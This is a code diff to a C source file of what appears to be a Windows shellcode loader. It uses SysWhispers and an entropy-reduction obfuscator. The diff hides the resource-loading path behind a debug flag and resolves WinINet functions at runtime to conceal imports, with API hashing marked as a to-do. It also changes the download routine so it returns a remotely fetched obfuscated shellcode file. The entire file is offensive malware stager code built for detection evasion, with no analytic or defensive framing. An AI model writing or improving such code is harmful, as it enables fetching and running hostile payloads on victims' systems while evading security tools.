@@ -1,8 +1,9 @@
 #include "Common.h"
-#include "Resource.h"
 #include "SysWhispers.h"
 #include "EntropyReducer.h"
 
+#ifdef _DEBUG
+#include "Resource.h"
 BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
 {
 	HRSRC		hRsrc = NULL;
@@ -42,9 +43,11 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 
 	return TRUE;
 }
+#endif
 
 // TODO: API hashing
-BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) {
+BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) 
+{
 
 	HANDLE		hInternet = NULL, hInternetFile = NULL;
 	PBYTE		pBytes = NULL;
@@ -64,11 +67,30 @@ BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.', L'o', L'b', L'f', L'u', L's', L'c', L'a', L't', L'e', L'd', L'.', L'b', L'i', L'n', L'\0'
 	};
 
+	HMODULE hWininet = LoadLibraryA("wininet.dll");
+	if (!hWininet) {
+		PRINTA("Failed to load wininet.dll\n");
+		return 1;
+	}
+
+	g_Api.pInternetOpenW = (fnInternetOpenW)GetProcAddress(hWininet, "InternetOpenW");
+	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddress(hWininet, "InternetCloseHandle");
+	g_Api.pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddress(hWininet, "InternetOpenUrlW");
+	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
+	g_Api.pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddress(hWininet, "InternetSetOptionW");
+
+	if (!g_Api.pInternetOpenW || !g_Api.pInternetCloseHandle || !g_Api.pInternetOpenUrlW || !g_Api.pInternetReadFile || !g_Api.pInternetSetOptionW) {
+		PRINTA("Failed to get function addresses\n");
+		// TODO: use API hashing for this function
+		FreeLibrary(hWininet);
+		return 1;
+	}
+
 	// Opening an internet session handle
-	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	hInternet = g_Api.pInternetOpenW(NULL, NULL, NULL, NULL, NULL);
 
 	// Opening a handle to the payload's URL
-	hInternetFile = InternetOpenUrlW(
+	hInternetFile = g_Api.pInternetOpenUrlW(
 		hInternet,
 		url,
 		NULL,
@@ -85,8 +107,8 @@ BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 
 	while (TRUE) {
 		// Reading the payload from the URL to the temporary buffer
-		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
-			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+		if (!g_Api.pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
 			return FALSE;
 		}
 
@@ -115,17 +137,18 @@ BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 
 		// If the bytes read are less than 1024, then break the loop as we reached the end of the payload
 		if (dwBytesRead < 1024) {
+			*ppPayloadAddress = pBytes;
+			*pPayloadSize = sSize;
 			break;
 		}
 	}
 
-	PrintHexData("InternetPayload", pBytes, sSize);
 	return TRUE;
 
 _EndOfFunction:
-	InternetCloseHandle(hInternetFile);
-	InternetCloseHandle(hInternet);
-	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	g_Api.pInternetCloseHandle(hInternetFile);
+	g_Api.pInternetCloseHandle(hInternet);
+	g_Api.pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 	LocalFree(pTmpBytes);
 	LocalFree(pBytes);
 	return FALSE;
